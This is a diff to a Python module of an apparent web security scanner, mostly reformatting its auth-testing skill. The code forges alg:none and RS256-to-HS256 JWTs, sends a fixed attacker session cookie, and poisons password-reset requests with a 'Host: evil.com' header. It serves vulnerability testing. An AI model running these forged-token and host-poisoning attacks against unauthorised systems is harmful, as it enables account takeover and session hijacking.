@@ -1,4 +1,5 @@
 """Skill: test_auth_deep — JWT attacks, session fixation, token analysis."""
+
 from __future__ import annotations
 import asyncio
 import base64
@@ -9,9 +10,13 @@ from ._payload_loader import load_skill_dataset as _load_ds
 
 logger = logging.getLogger(__name__)
 
-JWT_ALG_NONE_HEADERS = _load_ds("test_auth_deep", "jwt_alg_none_headers")  # ADR-007 Phase 3-9 — data in data/payloads/test_auth_deep.json
+JWT_ALG_NONE_HEADERS = _load_ds(
+    "test_auth_deep", "jwt_alg_none_headers"
+)  # ADR-007 Phase 3-9 — data in data/payloads/test_auth_deep.json
 
-RESET_PATHS = _load_ds("test_auth_deep", "reset_paths")  # ADR-007 Phase 3-9 — data in data/payloads/test_auth_deep.json
+RESET_PATHS = _load_ds(
+    "test_auth_deep", "reset_paths"
+)  # ADR-007 Phase 3-9 — data in data/payloads/test_auth_deep.json
 
 
 def _b64_encode(data: bytes) -> str:
@@ -77,11 +82,10 @@ async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> d
         if len(parts) >= 2:
             try:
                 decoded_header = json.loads(_b64_decode(parts[0]))
-                decoded_payload = json.loads(_b64_decode(parts[1]))
+                json.loads(_b64_decode(parts[1]))
                 logger.info("JWT header: %s", decoded_header)
             except Exception:
                 decoded_header = {}
-                decoded_payload = {}
 
             for alg_header in JWT_ALG_NONE_HEADERS:
                 tested += 1
@@ -96,27 +100,31 @@ async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> d
                             headers={"Authorization": f"Bearer {forged}"},
                         )
                         if r.status == 200:
-                            findings.append({
+                            findings.append(
+                                {
+                                    "type": "jwt_alg_none",
+                                    "payload": f"alg={alg_header['alg']}",
+                                    "evidence": f"Server accepted alg:none token (status {r.status})",
+                                    "response_preview": r.text[:300],
+                                    "control": {
+                                        "baseline_user_me": baseline_user_me,
+                                        "forged_status": r.status,
+                                        "forged_size": r.body_length,
+                                        "forged_preview": r.text[:180],
+                                        "header": alg_header,
+                                    },
+                                    "severity": "critical",
+                                }
+                            )
+                        control_evidence.append(
+                            {
                                 "type": "jwt_alg_none",
                                 "payload": f"alg={alg_header['alg']}",
-                                "evidence": f"Server accepted alg:none token (status {r.status})",
-                                "response_preview": r.text[:300],
-                                "control": {
-                                    "baseline_user_me": baseline_user_me,
-                                    "forged_status": r.status,
-                                    "forged_size": r.body_length,
-                                    "forged_preview": r.text[:180],
-                                    "header": alg_header,
-                                },
-                                "severity": "critical",
-                            })
-                        control_evidence.append({
-                            "type": "jwt_alg_none",
-                            "payload": f"alg={alg_header['alg']}",
-                            "status": r.status,
-                            "size": r.body_length,
-                            "preview": r.text[:180],
-                        })
+                                "status": r.status,
+                                "size": r.body_length,
+                                "preview": r.text[:180],
+                            }
+                        )
                     except Exception:
                         pass
 
@@ -135,27 +143,31 @@ async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> d
                             headers={"Authorization": f"Bearer {forged_hs}"},
                         )
                         if r.status == 200:
-                            findings.append({
+                            findings.append(
+                                {
+                                    "type": "jwt_alg_confusion",
+                                    "payload": "RS256->HS256",
+                                    "evidence": "Server accepted algorithm-confused token",
+                                    "response_preview": r.text[:300],
+                                    "control": {
+                                        "baseline_user_me": baseline_user_me,
+                                        "forged_status": r.status,
+                                        "forged_size": r.body_length,
+                                        "forged_preview": r.text[:180],
+                                        "original_alg": decoded_header.get("alg", ""),
+                                    },
+                                    "severity": "critical",
+                                }
+                            )
+                        control_evidence.append(
+                            {
                                 "type": "jwt_alg_confusion",
                                 "payload": "RS256->HS256",
-                                "evidence": "Server accepted algorithm-confused token",
-                                "response_preview": r.text[:300],
-                                "control": {
-                                    "baseline_user_me": baseline_user_me,
-                                    "forged_status": r.status,
-                                    "forged_size": r.body_length,
-                                    "forged_preview": r.text[:180],
-                                    "original_alg": decoded_header.get("alg", ""),
-                                },
-                                "severity": "critical",
-                            })
-                        control_evidence.append({
-                            "type": "jwt_alg_confusion",
-                            "payload": "RS256->HS256",
-                            "status": r.status,
-                            "size": r.body_length,
-                            "preview": r.text[:180],
-                        })
+                                "status": r.status,
+                                "size": r.body_length,
+                                "preview": r.text[:180],
+                            }
+                        )
                     except Exception:
                         pass
 
@@ -167,27 +179,34 @@ async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> d
                 "GET", "/", headers={"Cookie": "session=attacker_fixed_session"}
             )
             set_cookie = r.headers.get("set-cookie", "")
-            if "attacker_fixed_session" in set_cookie or "session=attacker_fixed_session" in set_cookie:
-                findings.append({
+            if (
+                "attacker_fixed_session" in set_cookie
+                or "session=attacker_fixed_session" in set_cookie
+            ):
+                findings.append(
+                    {
+                        "type": "session_fixation",
+                        "payload": "session=attacker_fixed_session",
+                        "evidence": "Server accepted attacker-supplied session ID",
+                        "response_preview": r.text[:300],
+                        "control": {
+                            "request_cookie": "session=attacker_fixed_session",
+                            "set_cookie": set_cookie[:240],
+                            "status": r.status,
+                            "preview": r.text[:180],
+                        },
+                        "severity": "high",
+                    }
+                )
+            control_evidence.append(
+                {
                     "type": "session_fixation",
                     "payload": "session=attacker_fixed_session",
-                    "evidence": "Server accepted attacker-supplied session ID",
-                    "response_preview": r.text[:300],
-                    "control": {
-                        "request_cookie": "session=attacker_fixed_session",
-                        "set_cookie": set_cookie[:240],
-                        "status": r.status,
-                        "preview": r.text[:180],
-                    },
-                    "severity": "high",
-                })
-            control_evidence.append({
-                "type": "session_fixation",
-                "payload": "session=attacker_fixed_session",
-                "status": r.status,
-                "set_cookie": set_cookie[:180],
-                "preview": r.text[:180],
-            })
+                    "status": r.status,
+                    "set_cookie": set_cookie[:180],
+                    "preview": r.text[:180],
+                }
+            )
         except Exception:
             pass
 
@@ -206,27 +225,31 @@ async def execute(target_url: str, token: str | None = None, **kwargs: Any) -> d
                 if r.status in (200, 201, 202):
                     body = r.text.lower()
                     if "evil.com" in body or "reset" in body:
-                        findings.append({
+                        findings.append(
+                            {
+                                "type": "password_reset_poisoning",
+                                "payload": f"Host: evil.com on {path}",
+                                "evidence": f"Reset endpoint responded to poisoned host (status {r.status})",
+                                "response_preview": r.text[:300],
+                                "control": {
+                                    "poisoned_host": "evil.com",
+                                    "status": r.status,
+                                    "size": r.body_length,
+                                    "preview": r.text[:180],
+                                    "path": path,
+                                },
+                                "severity": "high",
+                            }
+                        )
+                    control_evidence.append(
+                        {
                             "type": "password_reset_poisoning",
                             "payload": f"Host: evil.com on {path}",
-                            "evidence": f"Reset endpoint responded to poisoned host (status {r.status})",
-                            "response_preview": r.text[:300],
-                            "control": {
-                                "poisoned_host": "evil.com",
-                                "status": r.status,
-                                "size": r.body_length,
-                                "preview": r.text[:180],
-                                "path": path,
-                            },
-                            "severity": "high",
-                        })
-                    control_evidence.append({
-                        "type": "password_reset_poisoning",
-                        "payload": f"Host: evil.com on {path}",
-                        "status": r.status,
-                        "size": r.body_length,
-                        "preview": r.text[:180],
-                    })
+                            "status": r.status,
+                            "size": r.body_length,
+                            "preview": r.text[:180],
+                        }
+                    )
             except Exception:
                 pass
 
